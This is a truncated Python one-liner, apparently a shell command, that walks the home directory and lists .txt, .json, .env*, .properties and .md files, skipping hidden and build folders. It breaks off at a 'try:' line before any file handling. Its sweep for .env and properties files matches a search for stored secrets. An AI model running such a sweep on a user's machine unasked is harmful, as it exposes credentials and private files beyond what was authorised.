python -c "import os, glob
patterns = ['*.txt', '*.json', '*.env*', '*.properties', '*.md']
for root, dirs, files in os.walk(os.path.expanduser('~')):
    # Skip huge/irrelevant dirs
    dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ('AppData', 'node_modules', 'dist', '__pycache__')]
    for f in files:
        if any(f.endswith(ext.replace('*', '')) for ext in patterns):
            p = os.path.join(root, f)
            try:
